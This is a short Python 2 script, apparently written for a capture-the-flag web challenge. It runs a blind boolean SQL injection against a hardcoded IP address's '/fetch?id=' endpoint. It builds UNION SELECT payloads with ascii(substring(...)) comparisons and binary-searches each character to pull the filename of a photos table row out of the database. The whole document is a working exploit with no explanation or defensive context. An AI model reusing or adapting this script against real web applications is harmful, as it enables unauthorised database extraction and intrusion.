import requests

url = "http://34.74.105.127/fee67d467d/fetch?id="
payload = '0 union select "uwsgi.ini" from photos where ascii(substring((select filename from photos where id=3),{},{})) {} {}'
hasil = ""

def check (txt):
    return txt.find("module") != -1

def isTrue (batas, operator, asci):
    return check(requests.get(url + payload.format(batas, batas, operator, asci)).text)

idx = 0
flag = True

while flag:
    idx = len(hasil) + 1
    l = 0
    r = 128
    while True:
        mid = (l+r) // 2
        if isTrue(str(idx), ">", mid):
            l = mid + 1
        elif isTrue(str(idx), "<", mid):
            r = mid
        elif isTrue(str(idx), "=", mid):
            hasil = hasil + str(unichr(mid))
            print hasil
            if mid == 0:
                flag = False
            break



